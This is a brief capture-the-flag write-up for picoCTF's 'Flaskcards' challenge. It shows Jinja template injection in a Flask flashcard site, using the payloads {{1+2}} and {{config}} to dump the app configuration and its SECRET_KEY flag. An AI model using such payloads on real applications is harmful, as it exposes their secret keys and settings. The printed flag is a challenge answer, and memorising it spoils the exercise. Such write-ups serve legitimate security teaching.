> Flaskcards - Points: 350 - (Solves: 216)
> We found this fishy website for flashcards that we think may be sending secrets. Could you take a look?

We start by creating a user and going to the `create card` page.

From there we test simple template injection `{{1+2}}` which returns 3 on the list page meaning there is template injection.

Since it's named "Flask" my first guess is to try and print config variables like so `{{config}}`

This returns a lot of config variables with the flag being one of them:
```
Question:<Config {'SQLALCHEMY_BINDS': None, 'USE_X_SENDFILE': False, 'SESSION_REFRESH_EACH_REQUEST': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'BOOTSTRAP_USE_MINIFIED': True, 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSON_SORT_KEYS': True, 'SQLALCHEMY_MAX_OVERFLOW': None, 'TRAP_HTTP_EXCEPTIONS': False, 'TESTING': False, 'SQLALCHEMY_NATIVE_UNICODE': None, 'DEBUG': False, 'PROPAGATE_EXCEPTIONS': None,
'MAX_CONTENT_LENGTH': None, 'EXPLAIN_TEMPLATE_LOADING': False, 'JSON_AS_ASCII': True, 'JSONIFY_MIMETYPE': 'application/json', 'ENV': 'production', 'PREFERRED_URL_SCHEME': 'http', 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'SESSION_COOKIE_SECURE': False, 'TRAP_BAD_REQUEST_ERRORS': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'TEMPLATES_AUTO_RELOAD': None, 'SQLALCHEMY_POOL_SIZE': None, 'SESSION_COOKIE_SAMESITE': None,
'SQLALCHEMY_ECHO': False, 'SESSION_COOKIE_NAME': 'session', 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None, 'SESSION_COOKIE_HTTPONLY': True, 'SECRET_KEY': 'picoCTF{secret_keys_to_the_kingdom_e8a55760}', 'SESSION_COOKIE_PATH': None, 'MAX_COOKIE_SIZE': 4093, 'APPLICATION_ROOT': '/', 'BOOTSTRAP_SERVE_LOCAL': False, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SESSION_COOKIE_DOMAIN': False, 'SERVER_NAME': None,
'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_RECYCLE': None}>
```

Flag: `picoCTF{secret_keys_to_the_kingdom_e8a55760}`
